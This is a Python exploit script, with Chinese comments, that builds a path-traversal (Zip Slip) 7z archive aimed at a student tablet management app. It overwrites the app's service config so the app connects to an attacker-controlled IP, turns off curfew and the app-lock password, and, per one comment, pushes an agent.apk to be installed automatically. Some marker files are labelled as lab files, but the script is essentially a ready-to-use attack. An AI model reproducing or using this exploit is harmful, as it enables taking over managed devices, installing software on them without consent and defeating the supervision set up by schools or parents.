# -*- coding: utf-8 -*-
"""build_final_7z.py — 最终总载荷。

包含:
  A) 本地微服务表 XMConfigV1_1.ini / XMConfigV2.ini / XMConfigV3.ini / XMConfig.ini
     把教室/IM 服务(BSB301002 学校模式IM、BSB301006 局域网IM、SB103017 服务端IM 等)
     指向本机 ws://<OWN_IP>:8088  -> 学生端 XHMicroServer.getActualIp() 会返回我们的地址
  B) ControlConfig.ini 无夜禁配置(多路径/多时间窗)
  C) provider.ini / keep.ini (应用锁/管控重取)
  D) 可读回标记 (lab_zipslip.txt / lab_marker.xml)
  E) 相对穿越变体(深度 3..11) 覆盖未知解压目录

JSON 结构依据(代码级):
  ServerUrlUnify{ classId, schoolId, serverType, version, microServerNewDtoList:[MicroServerEntityUnify] }
  MicroServerEntityUnify{ addressType(IP/DOMAIN/NONE), dirLocation, domainOrIp, index, mode, port,
                          protocol(HTTP/HTTPS/WS/WSS/TCP/UDP/FTP/...), serverId, serverType, schList }
  getUrlFromList() = getMicro().getUrl() ;  getMicro() = microServerNewDtoList[currentIndex]
"""
import io
import json
import os
import struct
import subprocess
import time
import zlib

SZ = r'C:\Program Files\7-Zip\7z.exe'
W = r'C:\p200build\final7z'
OUT_NAME = 'final_fixed.7z'
os.makedirs(W, exist_ok=True)

OWN_IP = '192.168.137.1'
WS_PORT = 8088
SESSION = 0    # 0 = 会话服务(需 sessionId); 我们给合法值以免被过滤

NOCURFEW = '{"periods": [], "curfew": null}'

# ---------- A) 本地微服务表 ----------
TYPES = ["BSB301002", "BSB301006", "SB103017", "BSB301001", "BSB301004",
         "SB103013", "SB102002", "SA104009", "SA104028", "SB101011", "SB103015",
         # ★ 2026-10-07 07:25 补齐推送链关键键:
         #   UrlCache.getPushUrl()  = 微服务 SB103018  (推送SDK的 pbsUrl 基址!)
         #   UrlCache.getBigDataUrl()= 微服务 SB103019
         #   把 SB103018 指向我们(http://192.168.137.1:80)后, 端侧 PushCore 会请求
         #   /as/login 与 /as/getPbsServer -> 我方冒充器的 PNLOGIN 处理器 -> 端侧改连我们 20000
         #   -> push_pbs 下发 app-upgrade-prepare -> 从 80 端口下载 agent.apk -> 自动安装。
         "SB103018", "SB103019"]


def ent(stype, proto="WS", port=WS_PORT):
    return {
        "addressType": "IP",
        "dirLocation": "",
        "domainOrIp": OWN_IP,
        "index": 0,
        "mode": 0,
        "port": port,
        "protocol": proto,
        "serverId": 1,
        "serverType": stype,
        "schList": [],
    }


def unify(stype, proto="WS", port=WS_PORT):
    return json.dumps({
        "classId": 0,
        "schoolId": 0,
        "serverType": stype,
        "version": 1,
        "microServerNewDtoList": [ent(stype, proto, port)],
    }, ensure_ascii=False)


# 表文件内容: key=服务类型, value=JSON（另有常见别名键, 提高命中率）
table_lines = []
for t in TYPES:
    if t in ("SB103018", "SB103019"):
        # 推送/大数据基址: 明文 HTTP + 80 端口(我方冒充器全目标接管) => /as/login 直达我们
        proto, port = "HTTP", 80
    else:
        proto = "WS" if ("IM" in t or t.startswith("BSB")) else "HTTP"
        port = WS_PORT if proto == "WS" else 8080
    table_lines.append("%s=%s" % (t, unify(t, proto, port)))
    # 别名变体
    table_lines.append("micro_%s=%s" % (t, unify(t, proto, port)))
TABLE = ("\n".join(table_lines) + "\n").encode("utf-8")

# ---------- B) 无夜禁配置 ----------
def ms(y, mo, d, h, mi):
    return int(time.mktime((y, mo, d, h, mi, 0, 0, 0, -1)) * 1000)


now = time.localtime()
Y, MO, D = now.tm_year, now.tm_mon, now.tm_mday
wins = []
for dd in (-1, 0, 1):
    try:
        wins.append((ms(Y, MO, D + dd, 22, 30), ms(Y, MO, D + dd + 1, 6, 0)))
    except Exception:
        pass
wins.append((0, 0))
CURFEW = ("\n".join(["control_key_%d_%d=%s" % (s, e, NOCURFEW) for s, e in wins] +
                    ["curfew=null", "periods="]) + "\n").encode("utf-8")

CONTENTS = {
    "XMConfigV1_1.ini": TABLE,
    "XMConfigV2.ini": TABLE,
    "XMConfigV3.ini": TABLE,
    "XMConfig.ini": TABLE,
    "ControlConfig.ini": CURFEW,
    "provider.ini": b"is_need_input_lock_password=false\n",
    "keep.ini": b"controlVersion=0\n",
    "lab_zipslip.txt": b"P200-LAB FINAL ZIPSLIP MARKER\n",
    "lab_marker.xml": (b"<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n"
                       b"<map>\n  <string name=\"lab\">P200-LAB-FINAL</string>\n</map>\n"),
}

# ---------- 目标路径 ----------
CFG = ["/sdcard/xuehai/config", "/sdcard/xuehai/config/noUserSchoolId",
       "/sdcard/xuehai/config/prodnoUserSchoolId", "/sdcard/xuehai/config/mmkv",
       "/sdcard/xuehai/config/prodnoUserSchoolId/mmkv",
       "/storage/emulated/0/xuehai/config",
       "/storage/emulated/0/xuehai/config/noUserSchoolId"]
TARGETS = []
for d in CFG:
    for f in ("XMConfigV1_1.ini", "XMConfigV2.ini", "XMConfigV3.ini", "XMConfig.ini", "ControlConfig.ini"):
        TARGETS.append((d + "/" + f, f))
TARGETS += [
    ("/sdcard/xuehai/keep/provider.ini", "provider.ini"),
    ("/sdcard/xuehai/keep/keep.ini", "keep.ini"),
    ("/sdcard/xuehai/lab_zipslip.txt", "lab_zipslip.txt"),
    ("/storage/emulated/0/xuehai/lab_zipslip.txt", "lab_zipslip.txt"),
    ("/data/data/com.xh.smartclassstu/shared_prefs/lab_marker.xml", "lab_marker.xml"),
    ("/data/local/tmp/lab_zipslip.txt", "lab_zipslip.txt"),
]
for n in range(3, 12):
    pre = "../" * n
    TARGETS.append((pre + "sdcard/xuehai/config/noUserSchoolId/XMConfigV1_1.ini", "XMConfigV1_1.ini"))
    TARGETS.append((pre + "sdcard/xuehai/config/XMConfigV1_1.ini", "XMConfigV1_1.ini"))
    TARGETS.append((pre + "sdcard/xuehai/config/noUserSchoolId/ControlConfig.ini", "ControlConfig.ini"))
    TARGETS.append((pre + "sdcard/xuehai/config/ControlConfig.ini", "ControlConfig.ini"))
    TARGETS.append((pre + "sdcard/xuehai/keep/provider.ini", "provider.ini"))
    TARGETS.append((pre + "data/data/com.xh.smartclassstu/shared_prefs/lab_marker.xml", "lab_marker.xml"))

seen, PAIRS, idx = set(), [], 0
for path, key in TARGETS:
    if path in seen:
        continue
    seen.add(path)
    L = len(path)
    orig = ("f" * max(1, L - 8)) + ("%04d" % idx) + ".dat"
    if len(orig) != L:
        pad = L - 4 - len("%04d" % idx)
        orig = ("f" * max(1, pad)) + ("%04d" % idx) + ".dat"
    if len(orig) != L:
        orig = ("f" * (L - len(orig) + len(orig)))  # 保险
    assert len(orig) == L, (len(orig), L, orig)
    PAIRS.append((orig, path, key))
    idx += 1

arc = os.path.join(W, "final.7z")
if os.path.exists(arc):
    os.remove(arc)
srcs = []
for orig, _, key in PAIRS:
    fp = os.path.join(W, orig)
    io.open(fp, 'wb').write(CONTENTS[key])
    srcs.append(fp)

print("[1] 条目 %d" % len(PAIRS))
r = subprocess.run([SZ, 'a', '-mhc=off', '-t7z', arc] + srcs, capture_output=True, text=True)
print("[2] 7z rc=%d" % r.returncode)
if r.returncode != 0:
    print("    %s" % (r.stderr or '')[:300])
    raise SystemExit(1)

data = bytearray(io.open(arc, 'rb').read())
patched = 0
for orig, tgt, _ in PAIRS:
    o16 = orig.encode('utf-16-le')
    t16 = tgt.encode('utf-16-le')
    p = data.find(o16)
    if p >= 0:
        data[p:p + len(o16)] = t16
        patched += 1
print("[3] 替换 %d/%d" % (patched, len(PAIRS)))
struct.pack_into('<I', data, 28, zlib.crc32(bytes(data[32 + struct.unpack_from('<Q', data, 12)[0]:][:struct.unpack_from('<Q', data, 20)[0]])) & 0xFFFFFFFF)
struct.pack_into('<I', data, 8, zlib.crc32(bytes(data[12:32])) & 0xFFFFFFFF)

out = os.path.join(W, OUT_NAME)
io.open(out, 'wb').write(bytes(data))
print("[4] 输出 %s (%dB)" % (out, os.path.getsize(out)))

r2 = subprocess.run([SZ, 'l', '-slt', out], capture_output=True, text=True)
paths = [l for l in (r2.stdout or '').splitlines() if l.startswith('Path = ')]
print("[5] 验证 %d 条目; 示例:" % len(paths))
for l in paths[1:7]:
    print("    %s" % l[:118])
print("[6] 表样例: %s" % TABLE[:150])
